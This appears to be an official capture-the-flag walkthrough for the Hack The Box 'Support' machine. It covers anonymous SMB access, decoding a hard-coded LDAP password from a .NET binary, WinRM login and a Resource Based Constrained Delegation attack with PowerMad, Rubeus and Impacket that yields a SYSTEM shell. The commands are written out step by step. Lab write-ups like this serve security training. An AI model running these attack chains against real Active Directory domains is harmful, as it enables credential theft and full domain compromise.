@@ -1,0 +1,453 @@
+                     Support
+
+                                                                                  14th December 2022 / Document No
+                                                                            D22.100.198
+
+                                                                                  Prepared By: TRX
+                                                                                  Machine Author: 0xdf
+                                                                                  Difficulty: Easy
+                                                                                  Classification: Official
+
+Synopsis
+
+Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous
+authentication. After connecting to the share, an executable file is discovered that is used to query the
+machine's LDAP server for available users. Through reverse engineering, network analysis or emulation, the
+password that the binary uses to bind the LDAP server is identified and can be used to make further LDAP
+queries. A user called support is identified in the users list, and the info field is found to contain his
+password, thus allowing for a WinRM connection to the machine. Once on the machine, domain information
+can be gathered through SharpHound , and BloodHound reveals that the Shared Support Accounts
+group that the support user is a member of, has GenericAll privileges on the Domain Controller. A
+Resource Based Constrained Delegation attack is performed, and a shell as NT Authority\System is
+received.
+
+Skills Required
+
+      Basic Windows Knowledge
+      Basic active Directory Knowledge
+      Basic LDAP Knowledge
+
+Skills Learned
+      Connecting to an SMB share
+      Quering an LDAP server for information
+      Performing a Resource Based Constrained Delegation attack
+
+Enumeration
+
+Nmap
+
+   nmap -sC -sV -Pn 10.129.178.26
+
+Nmap scan shows a plethora of open ports, most of which suggest that the underlying OS is Windows. Of
+the open ports some of the more interesting are 389 (LDAP), 636 (LDAPS), 445 (SMB) and 5985(WinRM). As
+there is no web server listening on any of the ports and because this is a Windows system, let's check if
+there are any open SMB shares available.
+
+   smbclient -L \\\\10.129.178.26\\
+From the available shares, support-tools seems interesting as it is not a default share. Let's attempt to
+connect and list available files.
+
+   smbclient \\\\10.129.178.26\\support-tools
+Indeed we are able to connect to the share anonymously and list the available files. The share contains a
+few application installers such as putty or WireShark , but one file stands out. Specifically
+UserInfo.exe.zip does not seem like a well known application. Let's download it locally and investigate
+further.
+
+   smb: \> get UserInfo.exe.zip
+   getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (511.3 KiloBytes/sec)
+   (average 511.3 KiloBytes/sec)
+After the archive has been downloaded, exit from the SMB share and unzip it.
+   unzip UserInfo.exe.zip
+
+The archive contains quite a few DLL's as well as an executable file called UserInfo.exe .
+   file UserInfo.exe
+   UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+
+Checking the file type of UserInfo.exe shows that it is a .Net executable. As we are using a Linux system
+we have two ways to proceed. Decompiling the executable to see what it does or using Wine to attempt to
+run it.
+
+ILSpy
+
+In order to decompile the .Net executable we can use Avalonia ILspy, which is a cross-platform version of
+ILSpy that works on Linux. First let's download it from the releases page.
+   wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-
+   rc/Linux.x64.Release.zip
+Then we will have to extract the contents using unzip .
+   unzip Linux.x64.Release.zip
+   Archive: Linux.x64.Release.zip
+
+      inflating: ILSpy-linux-x64-Release.zip
+The archive will extract a second archive, which we must again unzip .
+
+   unzip ILSpy-linux-x64-Release.zip
+Finally we must navigate to the artifacts/linux-arm64 folder and run the ILSpy executable.
+
+   cd artifacts/linux-arm64
+   sudo ./ILSpy
+
+Let's now load the UserInfo executable in order to decompile it. Click on File , select Open , find the
+target binary in the file browser and select it.
+After the binary has been imported, ILSpy will take care the decompilation and we will be able to view the
+source code. Taking a look at the code we quickly notice a function called LdapQuery as well as two other
+functions called FindUser and GetUser .
+
+      public LdapQuery()
+      {
+
+          string password = Protected.getPassword();
+          entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
+          entry.set_AuthenticationType((AuthenticationTypes)1);
+          ds = new DirectorySearcher(entry);
+      }
+
+The code indicates that the binary is used to connect to a remote LDAP server and attempt to fetch user
+information. Let's add support.htb to our hosts file.
+
+   echo '10.129.178.26 support.htb' | sudo tee -a /etc/hosts
+
+The password to authenticate with the LDAP server is fetched from the Protected.getPassword()
+function.
+The code for this function is as follows.
+
+   internal class Protected
+   {
+
+      private static string enc_password =
+   "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
+
+      private static byte[] key = Encoding.ASCII.GetBytes("armando");
+
+      public static string getPassword()
+      {
+
+          byte[] array = Convert.FromBase64String(enc_password);
+          byte[] array2 = array;
+          for (int i = 0; i < array.Length; i++)
+          {
+
+              array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
+          }
+          return Encoding.Default.GetString(array2);
+      }
+   }
+
+The password seems to be encrypted using XOR. The decryption process is as follows:
+
+      The enc_password string is Base64 decoded and placed into a byte array.
+      A second byte array called array2 is created with the same value as array .
+      A loop is initialised, which loops through each character in array and XORs it with one letter of the key
+      and then with the byte 0xDFu (223).
+      Finally the decrypted key is returned.
+Let's create a Python script that performs the decryption process.
+
+   import base64
+   from itertools import cycle
+
+   enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
+   key = b"armando"
+   key2 = 223
+
+   res = ''
+   for e,k in zip(enc_password, cycle(key)):
+
+      res += chr(e ^ k ^ key2)
+
+   print(res)
+
+Save the above code into decrypt.py and run it.
+
+   python3 decrypt.py
+   nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+
+The script prints out the decrypted password and we can proceed to connect to the LDAP server to gather
+information.
+
+Wine
+
+A second way to determine the functionality of UserInfo.exe is to use Wine , an application that can run
+Windows applications on Linux systems, to run it.
+
+   wine UserInfo.exe
+Executing the binary with Wine shows its command line usage. Let's attempt to use the find flag to
+determine its functionality.
+
+   wine UserInfo.exe -v find
+   [-] At least one of -first or -last is required.
+
+The program states we also need a -first or -last flag. Let's add it.
+
+   wine UserInfo.exe -v find -first "test"
+   [*] LDAP query to use: (givenName=test)
+   [-] Exception: No Such Object
+
+Note: At this point if we have not already added support.htb to our hosts file, the binary will error out
+stating Connect error . There are various different ways to determine or even guess the hostname without
+using ILSpy, such as WireShark or strings for Windows.
+The binary seems to have successfully connected to the remote LDAP server and prints out the LDAP query
+that is being run, however, the test object is not found. A couple more attempts to find other objects
+prove to be unsuccessful.
+We can also attempt to inject the LDAP query to list all objects, however, this also fails.
+
+   wine UserInfo.exe -v find -first "*"
+   [*] LDAP query to use: (givenName=*)
+   [-] Exception: No Such Object
+
+Note: The binary is actually LDAP query injectable, however, this only works through Windows.
+The above failures might be due to Wine being an imperfect software and somewhere along the line, the
+execution of the binary fails and the names are not identified. We know the binary is connecting to the
+remote LDAP server on the box and somehow authenticating, so let's fire up WireShark and capture the
+network traffic to see if we can grab the username and password that are used for the authentication.
+Fire up WireShark and start capturing packets for the tun0 interface. Then run the binary again with wine
+as shown previously.
+
+   wine UserInfo.exe -v find -first "administrator"
+The LDAP authentication is captured in WireShark and clicking on the bindRequest packet shows the
+username and password combination in use. Specifically we can navigate to Lightweight Directory
+Access Protocol , open protocolOp and then bindRequest to identify the username support\ldap .
+Finally we can select authentication to view the password nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz .
+
+Foothold
+
+Having obtained the above credentials, let's connect to the LDAP server and see if we can find any
+interesting information. To connect we can use the ldapsearch utility. Let's install it.
+
+   sudo apt install ldap-utils
+After the utility has been installed let's attempt to bind to the LDAP server using ldap@support.htb as the
+BindDN with the -D flag, and specifying support and htb as the Domain Components with the -b flag.
+   ldapsearch -h support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
+   -b "dc=support,dc=htb" "*"
+
+When connecting to an LDAP server, the BindDN can be considered as a sort of username or account that
+we connect to and provides permissions to view and edit objects in the LDAP server.
+The Domain Components on the other hand can be thought of as a directory structure in LDAP. They are
+read from right to left and instruct the server on where to look and which objects to fetch for us. In this case
+we instructed the server to go to the htb domain component, find the support domain component and
+then search for any objects inside it with the name Administrator .
+The above command returns a large amount of data, which means the connection was successful.
+
+Apache Directory Studio
+
+Instead of ldapsearch we can also use the Apache Directory Studio program, which can be
+downloaded from here. It provides a graphical interface, which can be used to more efficiently view LDAP
+data.
+Download it locally and run it.
+Next, let's add a connection to the LDAP server by clicking the LDAP button on the top left of the screen.
+In this new page right click anywhere inside the Connections window and select New Connection .
+Input Support as the connection name, support.htb as the hostname and click Next .
+In the next window make sure to select Simple Authentication as the authentication method,
+ldap@support.htb as the Bind DN and paste in the password nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
+in the Bind password field. Then click the Check Authentication button to make sure that everything
+works properly.
+If the authentication was successful, click OK and select Finish .
+
+Back in the home screen of the Apache Directory Studio utility, we can see the Support connection at the
+bottom left. Double clicking it will allow us to connect to the remote LDAP server and list all of the LDAP
+objects.
+After opening DC=support,DC=htb we notice an object with a Common Name of users . This object
+contains all of the system users on the remote machine. Let's open it and enumerate further.
+
+From the users list one seems to stand out, called support . Taking a look at this user's properties, we find a
+non default tag called info with a value of Ironside47pleasure40Watchful . This seems a lot like a
+password. Further down we can also see that this user is a member of the Remote Management Users
+group, which allows them to connect over WinRM. To this end lets attempt to use evil-winrm to connect
+remotely to the support user with the identified password.
+   evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
+
+The connection is successful and the user flag can be found in C:\Users\Support\Desktop .
+
+Privilege Escalation
+
+The Nmap output already revealed to us that the machine belongs to a Domain. We can get more
+information about the domain through the Active Directory powershell module that is usually pre-installed
+on Domain Controllers.
+
+   Get-ADDomain
+Indeed the machine is the Domain Controller ( dc.support.htb ) for the support.htb domain. Let's add
+this hostname to our hosts file.
+
+   echo '10.129.178.26 dc.support.htb' | sudo tee -a /etc/hosts
+We can also check if the current user is a member of any interesting groups.
+
+   whoami /groups
+The support user seems to be a member of a non default group called Shared Support Accounts as well
+as the Authenticated Users group. Let's use BloodHound to identify potential attack paths is this domain
+that can help us increase our privileges.
+First let's install the Neo4j database that is needed by BloodHound.
+
+   sudo apt install -y neo4j
+
+Once installed, let's start the Neo4j database with the following command.
+
+   sudo neo4j start
+
+We can then download a pre-compiled BloodHound binary from the releases page. After downloading the
+correct archive for our CPU type, we can extract it and execute it.
+
+   unzip BloodHound-linux-x64.zip
+   ./BloodHound-linux-x64/BloodHound
+Click on Login and leave BloodHound on the side for now, as we will have to collect data from the remote
+machine before we proceed. To do this let's proceed to clone the BloodHound GitHub project locally.
+
+   git clone https://github.com/BloodHoundAD/BloodHound
+We will use the SharpHound.exe binary to collect Active Directory data, which is found in the BloodHound
+project and specifically in the BloodHound/Collectors/ directory.
+We can use the previously opened Evil-WinRM session to upload it (provided SharpHound.exe exists in the
+same folder as where we started Evil-WinRM from).
+
+   cd C:\Windows\Temp
+   upload SharpHound.exe
+
+After the binary has been uploaded, let's execute it.
+   ./SharpHound.exe
+
+Once the execution has finished we can see that a Zip file has been created in the same directory.
+
+This contains all of the gathered data. Let's download it using Evil-WinRM .
+   download 20221217070128_BloodHound.zip
+
+Once downloaded, we need only drag and drop the zip file into the BloodHound window to load the
+acquired data. Once the data has been loaded, we can search for SUPPORT@SUPPORT.HTB in the top left
+corner in order to find our current user. Then we can right click on the user object and select Mark User as
+Owned to specify that we already have access to the system as this user.
+The user details can be seen at the top left corner underneath the search bar.
+The above overview includes the user's group memberships, objects in the domain that the user has control
+over and other important information. We can see that the Group Delegated Object Control section
+shows a value of 1 . This value shows if a group that our user is a member of, has access to control objects
+in the domain. Let's click on it to see more details.
+Indeed the output shows that the Shared Support Accounts group has GenericAll privileges on the
+Domain Controller and since the support user is a member of this group, they as well have all privileges on
+the DC.
+
+Right clicking on the line called GenericAll and selecting Help provides more information about this
+privilege as well as how to exploit it.
+BloodHound mentions that due to the GenericAll privilege we can perform a Resource Based Constrained
+Delegation (RBCD) attack and escalate our privileges.
+
+Resource Based Constrained Delegation
+
+In a nutshell, through a Resource Based Constrained Delegation attack we can add a computer under
+our control to the domain; let's call this computer $FAKE-COMP01 , and configure the Domain Controller (DC)
+to allow $FAKE-COMP01 to act on behalf of it. Then, by acting on behalf of the DC we can request Kerberos
+tickets for $FAKE-COMP01 , with the ability to impersonate a highly privileged user on the Domain, such as
+the Administrator . After the Kerberos tickets are generated, we can Pass the Ticket (PtT) and authenticate
+as this privileged user, giving us control over the entire domain.
+
+The attack relies on three prerequisites:
+
+      We need a shell or code execution as a domain user that belongs to the Authenticated Users group.
+      By default any member of this group can add up to 10 computers to the domain.
+      The ms-ds-machineaccountquota attribute needs to be higher than 0. This attribute controls the
+      amount of computers that authenticated domain users can add to the domain.
+      Our current user or a group that our user is a member of, needs to have WRITE privileges
+      ( GenericAll , WriteDACL ) over a domain joined computer (in this case the Domain Controller).
+From our previous enumeration we know that the support user is indeed a member of the
+Authenticated Users group as well as the Shared Support Accounts group. We also know that the
+Shared Support Accounts group has GenericAll privileges over the Domain Controller
+( dc.support.htb ).
+Let's check the value of the ms-ds-machineaccountquota attribute.
+
+   Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-
+   MachineAccountQuota
+
+The output of the above command shows that this attribute is set to 10, which means each authenticated
+domain user can add up to 10 computers to the domain.
+Next, let's verify that the msds-allowedtoactonbehalfofotheridentity attribute is empty. To do so, we
+need the PowerView module for PowerShell. We can upload it to the server via Evil-WinRM as shown
+previously. We can then import it with the following command.
+
+   . ./PowerView.ps1
+Once the module has been imported we can use the Get-DomainComputer commandlet to query the
+required information.
+
+   Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
+The value is empty, which means we are ready to perform the RBCD attack, but first let's upload the tools
+that are required. We will need PowerMad and Rubeus, which we can upload using Evil-WinRM as shown
+previously. PowerMad can be imported with the following command.
+
+   . ./Powermad.ps1
+
+Creating a Computer Object
+
+Now, let's create a fake computer and add it to the domain. We can use PowerMad's New-MachineAccount
+to achieve this.
+
+   New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString
+   'Password123' -AsPlainText -Force)
+
+The above command added a machine with the name FAKE-COMP01 to the domain with the password
+Password123 . We can verify this new machine with the following command.
+
+   Get-ADComputer -identity FAKE-COMP01
+
+The output shows the details of FAKE-COMP01 and we can clearly see the SID value it was assigned.
+
+Configuring RBCD
+Next, we will need to configure Resource-Based Constrained Delegation through one of two ways. We can
+either set the PrincipalsAllowedToDelegateToAccount value to FAKE-COMP01 through the builtin
+PowerShell Active Directory module, which will in turn configure the msds-
+allowedtoactonbehalfofotheridentity attribute on its own, or we can use the PowerView module to
+directly set the msds-allowedtoactonbehalfofotheridentity attribute.
+For the purposes of this walkthrough we will use the former as it is a bit easier to understand. Let's use the
+Set-ADComputer command to configure RBCD.
+
+   Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
+To verify that the command worked, we can use the Get-ADComputer command.
+
+   Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
+
+As we can see, the PrincipalsAllowedToDelegateToAccount is set to FAKE-COMP01 , which means the
+command worked. We can also verify the value of the msds-allowedtoactonbehalfofotheridentity .
+
+   Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
+As we can see, the msds-allowedtoactonbehalfofotheridentity now has a value, but because the type
+of this attribute is Raw Security Descriptor we will have to convert the bytes to a string to understand
+what's going on.
+First, let's grab the desired value and dump it to a variable called RawBytes .
+
+   $RawBytes = Get-DomainComputer DC -Properties 'msds-
+   allowedtoactonbehalfofotheridentity' | select -expand msds-
+   allowedtoactonbehalfofotheridentity
+
+Then, let's convert these bytes to a Raw Security Descriptor object.
+
+   $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList
+   $RawBytes, 0
+
+Finally, we can print both the entire security descriptor, as well as the DiscretionaryAcl class, which
+represents the Access Control List that specifies the machines that can act on behalf of the DC.
+
+   $Descriptor
+   $Descriptor.DiscretionaryAcl
+From the output we can see that the SecurityIdentifier is set to the SID of FAKE-COMP01 that we saw
+earlier, and the AceType is set to AccessAllowed .
+
+Performing a S4U Attack
+
+It is now time to perform the S4U attack, which will allow us to obtain a Kerberos ticket on behalf of the
+Administrator. We will be using Rubeus to perform this attack.
+First, we will need the hash of the password that was used to create the computer object.
+
+   .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
+We need to grab the value called rc4_hmac . Next, we can generate Kerberos tickets for the Administrator.
+
+   rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71
+   /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
+Rubeus successfuly generated the tickets. We can now grab the last Base64 encoded ticket and use it on our
+local machine to get a shell on the DC as Administrator . To do so, copy the value of the last ticket and
+paste it inside a file called ticket.kirbi.b64 .
+Note: Before pasting the value to the file make sure to remove any whitespace characters from the value.
+Next, create a new file called ticket.kirbi with the Base64 decoded value of the previous ticket.
+
+   base64 -d ticket.kirbi.b64 > ticket.kirbi
+
+Finally, we can convert this ticket to a format that Impacket can use. This can be achieved with Impackets'
+TicketConverter.py .
+
+   ticketConverter.py ticket.kirbi ticket.ccache
+To acquire a shell we can use Impackets' psexec.py .
+   KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
+
+A shell as NT Authority\System is successfully received and the root flag can be found in
+C:\Users\Administrator\Desktop .
+
